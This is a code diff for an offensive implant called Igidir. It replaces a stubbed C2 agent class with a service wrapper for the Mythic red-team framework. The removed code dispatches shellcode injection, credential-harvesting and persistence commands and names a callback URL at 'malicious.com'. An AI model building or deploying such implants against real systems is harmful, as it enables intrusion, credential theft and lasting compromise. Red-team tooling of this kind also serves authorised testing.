@@ -1,96 +1,52 @@
+import logging
+import os
 import sys
+import traceback
+from mythic_container import mythic_service
+import mythic_container
 import json
-import base64
-import threading
-import time
-from .crypto.aes import AESEncryptor
-from .crypto.rsa import RSAEncryptor
-from .capabilities.injection import ProcessInjector
-from .capabilities.credential_harvesting import CredentialHarvester
-from .capabilities.persistence import PersistenceManager
 
-class IGIDIRAgent:
-    def __init__(self, config):
-        self.config = config
-        self.aes = AESEncryptor(config['aes_key'])
-        self.rsa = RSAEncryptor(config['rsa_pub_key'])
-        self.running = True
-        self.callback_interval = int(config.get('callback_interval', 10))
+# Import our agent-specific components
+from igidir import IgidirAgent
+
+
+async def start_agent_service():
+    """
+    Start the Mythic agent service for the Igidir agent
+    """
+    # Set up logging
+    logging.basicConfig(
+        level=logging.INFO,
+        format="%(asctime)s - %(name)s - [%(levelname)s] - %(message)s",
+    )
+    
+    try:
+        # Load config from rabbitmq_config.json
+        config_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "rabbitmq_config.json")
+        with open(config_file, 'r') as config_json:
+            config = json.load(config_json)
         
-    def start(self):
-        """Main agent loop"""
-        while self.running:
-            try:
-                # Check for tasks
-                tasks = self.get_tasks()
-                
-                if tasks:
-                    for task in tasks:
-                        self.process_task(task)
-                
-                time.sleep(self.callback_interval)
-            except Exception as e:
-                print(f"Error in main loop: {str(e)}", file=sys.stderr)
-                time.sleep(30)
-    
-    def get_tasks(self):
-        """Simulate getting tasks from C2"""
-        # In a real implementation, this would make an HTTP request
-        return []
-    
-    def process_task(self, task):
-        """Process a task from the C2 server"""
-        try:
-            command = task.get('command')
-            args = task.get('args', {})
-            
-            if command == "process_inject":
-                injector = ProcessInjector()
-                pid = args.get('pid')
-                shellcode = base64.b64decode(args.get('shellcode', ''))
-                result = injector.inject(pid, shellcode)
-                self.send_response(task['task_id'], result)
-                
-            elif command == "cred_harvest":
-                harvester = CredentialHarvester()
-                source = args.get('source', 'memory')
-                result = harvester.harvest(source)
-                self.send_response(task['task_id'], result)
-                
-            elif command == "persistence":
-                persister = PersistenceManager()
-                method = args.get('method', 'registry')
-                result = persister.establish(method)
-                self.send_response(task['task_id'], result)
-                
-            else:
-                self.send_response(task['task_id'], {
-                    "status": "error",
-                    "error": "Unknown command"
-                })
-                
-        except Exception as e:
-            self.send_response(task['task_id'], {
-                "status": "error",
-                "error": str(e)
-            })
-    
-    def send_response(self, task_id, data):
-        """Send task response back to C2"""
-        # In a real implementation, this would make an HTTP request
-        print(f"Sending response for task {task_id}: {json.dumps(data)}")
+        # Create our agent service
+        agent_service = mythic_service.PayloadServiceRPC(
+            payload_type="igidir",
+            service_name="igidir_payload_service",
+            rabbit_host=config["rabbit_host"],
+            rabbit_port=config["rabbit_port"],
+            rabbit_vhost=config["rabbit_vhost"],
+        )
 
-def main():
-    # Example configuration - would come from C2 in real implementation
-    config = {
-        "aes_key": "0123456789abcdef0123456789abcdef",
-        "rsa_pub_key": "-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----",
-        "callback_interval": 10,
-        "callback_url": "https://malicious.com/callback"
-    }
-    
-    agent = IGIDIRAgent(config)
-    agent.start()
+        # Register our agent with the service
+        igidir_agent = IgidirAgent()
+        await agent_service.register_payload_type_service(igidir_agent)
+        
+        # Start listening for tasking
+        await agent_service.start()
+        
+    except Exception as e:
+        logging.error(f"Failed to start agent service: {e}")
+        traceback.print_exc()
+
 
 if __name__ == "__main__":
-    main()
+    # Start the async event loop for the agent service
+    mythic_container.run_asyncio(start_agent_service())
